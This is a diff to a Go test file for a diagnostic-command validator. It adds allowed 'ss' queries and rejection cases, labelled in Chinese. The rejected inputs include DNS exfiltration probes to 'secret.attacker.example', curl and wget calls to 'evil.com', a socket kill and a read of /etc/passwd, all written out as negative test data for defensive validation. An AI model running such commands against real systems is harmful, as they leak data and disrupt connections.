@@ -23,6 +23,9 @@ func TestValidateDiagnosticCommandAllowsWhitelisted(t *testing.T) {
 		{"sort", "-tT", "/tmp/data.csv"},
 		{"hostname", "-f"},
 		{"mount", "-l"},
+		{"ss"},
+		{"ss", "-lntp"},
+		{"ss", "--tcp", "--listening", "--numeric", "--processes"},
 	}
 	for _, cmd := range cases {
 		if err := ValidateDiagnosticCommand(cmd); err != nil {
@@ -44,6 +47,12 @@ func TestValidateDiagnosticCommandRejectsDangerous(t *testing.T) {
 		{"包管理", []string{"apk", "add", "curl"}},
 		{"外联 curl", []string{"curl", "http://evil.com"}},
 		{"外联 wget", []string{"wget", "http://evil.com"}},
+		{"任意 DNS 外联", []string{"nslookup", "secret.attacker.example"}},
+		{"自定义 DNS 服务器", []string{"nslookup", "kubernetes.default", "8.8.8.8"}},
+		{"DNS 探针大小写变体", []string{"nslookup", "KuBeRnEtEs.DeFaUlT"}},
+		{"DNS 探针尾点变体", []string{"nslookup", "kubernetes.default."}},
+		{"DNS 探针空白变体", []string{"nslookup", " kubernetes.default"}},
+		{"NSS DNS 外联", []string{"getent", "hosts", "secret.attacker.example"}},
 		{"绝对路径可执行", []string{"/bin/sh"}},
 		{"相对路径可执行", []string{"../bin/x"}},
 		{"管道元字符", []string{"cat", "/etc/passwd", "|", "grep", "root"}},
@@ -88,6 +97,12 @@ func TestValidateDiagnosticCommandRejectsDangerous(t *testing.T) {
 		{"ss kill socket", []string{"ss", "-K", "dst", "10.0.0.1"}},
 		{"ss long kill", []string{"ss", "--kill", "dst", "10.0.0.1"}},
 		{"ss 缩写 kill", []string{"ss", "--kil", "dst", "10.0.0.1"}},
+		{"ss DNS 目标过滤", []string{"ss", "dst", "secret.attacker.example"}},
+		{"ss DNS 来源过滤", []string{"ss", "src", "secret.attacker.example"}},
+		{"ss 主动解析", []string{"ss", "--resolve"}},
+		{"ss 外部过滤文件", []string{"ss", "-F", "/tmp/filter"}},
+		{"ss 写诊断文件", []string{"ss", "-D", "/tmp/sockets.raw"}},
+		{"ss 持续事件", []string{"ss", "-E"}},
 		{"nslookup 交互模式", []string{"nslookup"}},
 		{"uniq 输出文件", []string{"uniq", "/etc/hosts", "/tmp/result"}},
 	}
